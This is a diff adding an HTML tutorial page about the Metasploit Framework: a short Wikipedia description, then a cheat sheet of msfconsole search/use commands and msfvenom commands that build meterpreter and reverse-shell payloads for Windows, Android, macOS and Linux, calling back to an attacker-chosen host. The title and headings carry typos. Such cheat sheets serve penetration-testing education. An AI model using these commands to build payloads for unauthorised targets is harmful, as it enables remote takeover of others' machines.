@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Metasplit Framework | Explane</title>
+<style type="text/css">
+	body {
+		background-image: url("background.jpg");
+		background-attachment: fixed;
+		background-repeat: no-repeat;
+		background-size: cover;
+		text-align: center;
+		font-family: monospace;
+		color: white;
+		text-shadow: 1px 2px black;
+		word-wrap: break-word;
+	}
+.navbar {
+  overflow: hidden;
+  background-color: #333;
+  position: fixed;
+  top: 0; 
+  width: 100%;
+}
+
+.navbar a {
+  float: left;
+  display: block;
+  color: #f2f2f2;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+.navbar a:hover {
+  background: #ddd;
+  color: black;
+  text-shadow: none;
+}
+
+article {
+  margin-top: 70px;
+  text-transform: capitalize;
+}
+
+p {
+	background-color: black;
+	margin-right: 20%;
+	margin-left: 20%;
+	border-style: solid;
+	border-width: 1px;
+	border-color: white;
+	padding: 6px;
+	text-transform: none;
+}
+
+</style>
+</head>
+<body>
+<header>
+<div class="navbar">
+  <a href="index.html">Home</a>
+  <a href="tutorial.html">Tutorials</a>
+  <a href="help.html">Help</a>
+</div>
+</header>
+<article>
+<h2>Metasploit Framework</h2>
+The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. It is owned by Boston, Massachusetts-based security company Rapid7. <br>Src : <a href="https://en.wikipedia.org/wiki/Metasploit_Project">Wikipedia</a><br>
+
+<h3>Who to use</h3>	
+
+<h4>Search a module</h4>
+
+<p class="searchm">msf > search [regex]</p>
+
+<h4>Create a payload</h4>
+<p>Windows x64 :<br> sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=[PORT] > filename.exe <br>
+<br><br>
+Windows x86 :<br> sudo msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] > filename.exe </p>
+<p>Android :<br> 
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] > filename.apk
+</p>
+<p>MacOS :<br>
+msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f macho -o filename.bin
+</p>
+<p>Linux :<br>
+msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -b "\x00" -f elf -o filename
+</p>
+<h4>Use an exploit</h4>
+
+<p class="useexploit">msf > use exploit/[ExploitPath]</p>
+src : <a href="https://www.offensive-security.com/metasploit-unleashed/generating-payloads/">Offensive-Security</a>
+</article>
+</body>
+</html>
